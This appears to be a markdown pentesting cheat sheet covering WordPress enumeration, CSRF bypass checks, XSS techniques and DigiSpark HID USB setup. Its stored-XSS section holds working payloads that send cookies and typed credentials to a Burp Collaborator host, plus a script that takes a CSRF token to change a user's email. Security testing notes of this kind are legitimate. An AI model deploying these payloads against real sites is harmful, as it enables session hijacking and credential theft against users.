## WEB
### Wordpress

- Run wpscan to gain basic information on the website.

- Check for installed plugins, themes and default pages.

- By default, the route /wp-json/wp/v2/user can list users. 

- Try bruteforcing the login page and see if lockout policy is implemented, if DoS is prevented via blocking or connection throttling. To test the lockout, try 100+ passwords and then try to login.

- Check all possible input fields around the page for client-side vulnerabilities (ex. XSS, CSRF)

- Check if XML-RPC is enabled. Issuing a POST request to /xmlrpc.php with the following payload should return all available methods (if enabled):
```
  <?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param>
    </param>
  </params>
</methodCall>
```
If enabled various attacks can be tested, Pingback, code injection, bruteforce etc.

### CSRF

If csrf token is present:
- Change method of request from POST to GET
- Try removing the csrf token from request completely
- Check if csrf token is tied to user session. Check if a csrf token of a logged in user will be accepted when the request is made by another user. 

### XSS

### Reflected

- Bypassing filters - When tags are filtered, use Burp to enumerate custom tags that pass the check. Use this custom tag with an onfocus event or an available event with a certain id, ex. id=’x’ and the code #x in the end of the command in order focus on this element as soon as the page is loaded.

### Stored

- Getting the session cookie of a user
```
<script> 
fetch('https://727hmmjs30bdhtmvi7l0ww5m8de42vqk.oastify.com', 
{ method: 'POST', 
mode: 'no-cors', 
body:document.cookie }); 
</script>
```

- Getting the user’s username and password
```
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
- Forcing the user to issue a change mail request with a csrf token embedded
```
<script> var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() 
	{ var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
var changeReq = new XMLHttpRequest(); 
changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') };

## HID USB
By having access to a DigiSpark Attiny85 USB one could use the board in order to emulate a keyboard and execute commands or payloads on the computer that the USB got connected. In order to upload the code to the board Arduino IDE can be used and the lirary Digispark AVR Boards should be installed. The Board must be set to Digispark (Default - 16.5mhz) and the Programmer to Micronucleous. After verifying the code,when clicking upload, the USB should be disconnected and plugged when prompted. 
> At the time of writing Digispark official website is not accessible, therefore the link used to install the library is this https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json.
